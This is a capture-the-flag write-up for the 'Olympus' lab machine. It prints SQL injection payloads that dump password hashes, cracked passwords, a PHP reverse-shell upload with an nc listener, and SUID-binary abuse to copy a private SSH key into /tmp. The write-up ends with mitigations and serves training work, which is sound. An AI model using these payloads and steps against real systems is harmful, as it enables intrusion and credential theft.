# Olympus CTF - Complete Penetration Test Writeup

## Executive Summary

This document outlines a complete penetration test of the Olympus CTF challenge, demonstrating exploitation of SQL injection vulnerabilities, privilege escalation via SUID binaries, and unauthorized access to sensitive systems. Four flags were successfully captured through systematic reconnaissance, exploitation, and post-exploitation techniques.

---

## Table of Contents

1. [Initial Reconnaissance](#initial-reconnaissance)
2. [SQL Injection Exploitation](#sql-injection-exploitation)
3. [Web Application Access](#web-application-access)
4. [Remote Code Execution](#remote-code-execution)
5. [Privilege Escalation](#privilege-escalation)
6. [Post-Exploitation](#post-exploitation)
7. [Flags Captured](#flags-captured)

---

## Initial Reconnaissance

### Subdomain Discovery

Performed fuzzing on the target using `ffuf` with the `common.txt` wordlist:

```bash
ffuf -w pentest-wordlists/common.txt -u http://10.114.166.173/FUZZ -H "Host: olympus.thm"
```

**Result:**
- Discovered `/~webmaster` endpoint

### Initial Access Attempt

- Attempted default credentials on `/~webmaster` - **unsuccessful**
- Shifted focus to search functionality on the main application
- Identified SQL injection vulnerability when testing special characters in search field

### Vulnerability Discovery

When submitting a single quote (`'`) in the search field:
- Application returned: "Query FailYou"
- This error message indicated SQL injection vulnerability
- Researched "Victor CMS" and confirmed known SQLi vulnerability in search functionality

---

## SQL Injection Exploitation

### UNION-Based SQL Injection

Used Burp Suite to capture the search request and saved it as `req.txt` for SQLMap analysis.

SQLMap confirmed the search parameter was vulnerable to SQL injection.

### Discovering Database Structure

#### Testing UNION SELECT Syntax

```sql
test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
test' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
```

Determined the query requires 10 columns.

#### Enumerating Tables

```sql
test' UNION SELECT NULL,NULL,table_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL from information_schema.tables#
```

**Tables Discovered:**
- `users`
- `flag`
- `chats`

### Flag #1 - Database Flag

#### Extracting flag table columns

```sql
test' UNION SELECT NULL,NULL,column_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL from information_schema.columns where table_name='flag'#
```

#### Retrieving flag data

```sql
test' UNION SELECT NULL,NULL,flag,NULL,NULL,NULL,NULL,NULL,NULL,NULL from flag#
```

**✓ FLAG #1 CAPTURED**

---

## Web Application Access

### Extracting User Credentials

#### Discovering user columns

```sql
test' UNION SELECT NULL,NULL,column_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL from information_schema.columns where table_name='users'#
```

**Columns found:** `user_name`, `user_password`

#### Dumping user credentials

```sql
test' UNION SELECT NULL,NULL,user_name,user_password,NULL,NULL,NULL,NULL,NULL,NULL from users#
```

**Users and Password Hashes:**

| User | Password Hash |
|------|---------------|
| root | $2y$10$lcs4XWc5yjVNsMb4CUBGJevEkIuWdZN3rsuKWHCc.FGtapBAfW.mK |
| prometheus | $2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C |
| zeus | $2y$10$cpJKDXh2wlAI5KlCsUaLCOnf0g5fiG0QSUS53zp/r0HMtaj6rT4lC |

### Cracking Prometheus Password

Used John the Ripper to crack the prometheus hash:

```bash
john --wordlist=~/pentest-wordlists/rockyou.txt prometheus.hash
```

**Result:**
- Username: `prometheus`
- Password: `summertime`

### Discovering chat.olympus.thm Subdomain

After logging into the main application as prometheus:
- Found users list in the website tour
- Noticed prometheus email: `prometheus@olympus.thm`
- Other users had email domain: `chat.olympus.thm`
- Added `chat.olympus.thm` to `/etc/hosts`

This revealed a separate chat application with its own login portal.

Successfully logged in using prometheus credentials (`prometheus:summertime`).

---

## Remote Code Execution

### Discovering File Upload Mechanism

Found conversation between prometheus and zeus in the chat application where prometheus sent a file. This led to investigating the `chats` table.

#### Extracting chats table information

```sql
test' UNION SELECT NULL,NULL,column_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL from information_schema.columns where table_name='chats'#
```

**Columns:** `dt`, `file`, `msg`, `uname`

#### Querying chat messages

```sql
' UNION SELECT NULL,null,file,msg,NULL,NULL,NULL,NULL,NULL,NULL from chats#
```

**Key Finding:** File `47c3210d51761686f3af40a875eeaaea.txt` identified as `prometheus_password.txt`

### Exploiting File Upload Feature

Discovered profile.php had a file upload functionality. Created PHP reverse shell using `pentestmoney/php-reverse-shell`.

#### Initial Attempt

Direct navigation to `/img/php-reverse-shell.php` returned **403 Forbidden**

#### Upload via Chat

Uploaded the PHP shell through the chat application.

#### Locating Uploaded Files

Used Gobuster to discover web directories:

```bash
gobuster dir -u http://chat.olympus.thm -w wordlist.txt
```

**Discovery:** `/static/` and `/uploads/` directories exist

#### Testing Upload Path

- Initial test: `http://chat.olympus.thm/uploads/47c3210d51761686f3af40a875eeaaea.txt` returned troll message: "you really thought it would be this easy ?!"
- Generated PHP shell filename: `90c14460391eca359e6215dddf8ea4bc.php`

### Establishing Reverse Shell Connection

**Initial Issue:** Reverse shell payload had hardcoded IP/port that didn't match attacker's machine.

**Solution:** Modified PHP shell to use correct attacker IP and port.

```bash
nc -lvnp 1234
```

Successfully established reverse shell connection to the target system.

### Post-Connection Enumeration

```bash
sudo -l
id
whoami
ls /home/
```

**Findings:**
- Home directories: `/home/ubuntu` and `/home/zeus`
- User flag found: `/home/zeus/user.flag`

**✓ FLAG #2 CAPTURED**

---

## Privilege Escalation

### Identifying SUID Binaries

Per hint received, focused on SUID bit set files:

```bash
find / -perm -4000 2> /dev/null
```

**Key Finding:** `/usr/bin/cputils` had unusual ownership - owned by `zeus` instead of `root`

### Analyzing cputils Binary

Investigation revealed `cputils` is a copying tool with SUID privileges.

### Exploitation Method

Used the SUID binary to copy files with elevated privileges:

1. Copied SSH private key from zeus's account:
   ```bash
   cputils /home/zeus/.ssh/rsa_id /tmp/rsa_id
   ```

2. Retrieved the SSH key:
   ```bash
   cat /tmp/rsa_id
   ```

3. Saved zeus's SSH private key locally

### SSH Key Cracking

The SSH key was passphrase-protected. Used ssh2john to hash it:

```bash
python3 /usr/lib/john/ssh2john.py zeus_ssh_key > zeus_ssh_key.hash
```

Cracked with John the Ripper:

```bash
john --wordlist=~/pentest-wordlists/rockyou.txt zeus_ssh_key.hash
```

**Passphrase:** `snowflake`

Successfully connected via SSH to zeus account.

---

## Post-Exploitation

### Discovering Zeus-Owned Files

Searched for all files owned by zeus group:

```bash
find / -group zeus -ls 2>/dev/null
```

**Suspicious Finding:**
```
/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php
```

### Analyzing the Backdoor PHP File

Located and examined the mysterious PHP file that didn't exist in normal web browsing.

The PHP code contained:
- Hardcoded password protection
- Mention of a backdoor reference
- SUID binary path: `/lib/defended/libc.so.99`

### Root Access via Backdoor

Found the root backdoor mechanism in the PHP code:

```php
$suid_bd = "/lib/defended/libc.so.99";
```

Successfully gained root access using the backdoor.

### Flag #3 - Root Flag

Navigated to `/root` directory and found the root flag file:

```bash
cat /root/root.flag
```

**✓ FLAG #3 CAPTURED**

---

## Finding the Bonus Flag

### Grepping for Flag Files

Conducted a targeted search in `/etc` as per the hint provided:

```bash
grep -rl "flag{" /etc
```

**Result:** `/etc/ssl/private/.b0nus.fl4g`

**✓ FLAG #4 (BONUS) CAPTURED**

---

## Flags Captured

| Flag # | Source | Status |
|--------|--------|--------|
| 1 | Database (SQL Injection) | ✓ Captured |
| 2 | Zeus User Home Directory | ✓ Captured |
| 3 | Root Home Directory | ✓ Captured |
| 4 (Bonus) | /etc/ssl/private/.b0nus.fl4g | ✓ Captured |

---

## Vulnerability Summary

### Critical Vulnerabilities

1. **SQL Injection in Search Functionality**
   - Severity: **CRITICAL**
   - Impact: Complete database compromise, credential extraction
   - Mitigation: Use parameterized queries, input validation

2. **Weak Password Hashing**
   - Severity: **HIGH**
   - Impact: User passwords cracked via dictionary attack (rockyou.txt)
   - Mitigation: Use stronger password policy, increase bcrypt rounds

3. **SUID Binary Misconfiguration**
   - Severity: **CRITICAL**
   - Impact: Arbitrary file read as elevated user
   - Mitigation: Audit SUID binaries, use proper access controls

4. **Unprotected SSH Private Keys**
   - Severity: **HIGH**
   - Impact: Account compromise with passphrase cracking
   - Mitigation: Implement key rotation, stronger passphrases

5. **Web Shell Upload**
   - Severity: **CRITICAL**
   - Impact: Remote code execution, system compromise
   - Mitigation: Disable script execution in upload directories, validate file types

6. **Hardcoded Credentials in PHP**
   - Severity: **CRITICAL**
   - Impact: Unauthorized backdoor access
   - Mitigation: Use environment variables, secure credential management

---

## Tools and Techniques Used

### Reconnaissance
- `ffuf` - Fuzzing for subdomain discovery
- `Burp Suite` - Request capture and manipulation

### Exploitation
- `SQLMap` - SQL injection detection and exploitation
- SQL UNION-based injection for data extraction
- PHP reverse shell (`pentestmoney/php-reverse-shell`)
- `nc` - Netcat for reverse shell connection

### Privilege Escalation
- `find` - SUID binary discovery
- `ssh2john` - SSH key conversion for cracking
- John the Ripper - Password/passphrase cracking
- Wordlist: `rockyou.txt`

### Post-Exploitation
- Standard Unix tools: `find`, `grep`, `cat`, `ls`
- SSH key extraction and usage

---

## Timeline

1. ✓ Subdomain enumeration → discovered `/~webmaster`
2. ✓ SQL injection discovery in search functionality
3. ✓ Database structure enumeration → found flag table
4. ✓ **Flag #1 captured** from database
5. ✓ User credential extraction and cracking
6. ✓ prometheus account access
7. ✓ chat.olympus.thm discovery
8. ✓ File upload mechanism exploitation
9. ✓ Remote shell establishment
10. ✓ **Flag #2 captured** from zeus home directory
11. ✓ SUID binary identification and exploitation
12. ✓ SSH key extraction and passphrase cracking
13. ✓ zeus account access via SSH
14. ✓ Backdoor PHP file discovery
15. ✓ Root access via backdoor
16. ✓ **Flag #3 captured** from root directory
17. ✓ **Flag #4 (Bonus) captured** from /etc/ssl/private/

---

## Lessons Learned

1. **Defense in Depth:** Multiple single points of failure allowed complete system compromise
2. **Input Validation:** SQL injection could have been prevented with parameterized queries
3. **File Permissions:** Improper SUID configuration and file ownership led to privilege escalation
4. **Credential Security:** Weak passwords and unprotected SSH keys compromised user accounts
5. **Web Application Security:** Unrestricted file uploads enabled RCE
6. **Configuration Management:** Hardcoded credentials and suspicious files should be audited

---

## Recommendations

### Immediate Actions
1. Patch SQL injection vulnerability in search functionality
2. Implement Web Application Firewall (WAF) rules
3. Disable file execution in upload directories
4. Audit and remove hardcoded credentials
5. Review and correct SUID binary permissions

### Short-term
1. Implement mandatory parameterized queries
2. Increase bcrypt rounds for password hashing
3. Enforce strong password policy
4. Implement SSH key rotation policy
5. Deploy intrusion detection system (IDS)

### Long-term
1. Implement Security Information and Event Management (SIEM)
2. Regular penetration testing program
3. Security awareness training for developers
4. Code review process for security vulnerabilities
5. Incident response plan development

---

**Report Generated:** CTF Challenge Completion
**Penetration Tester:** Aymen
**Target System:** Olympus (10.114.166.173)
**Flags Captured:** 4/4 (100%)

---
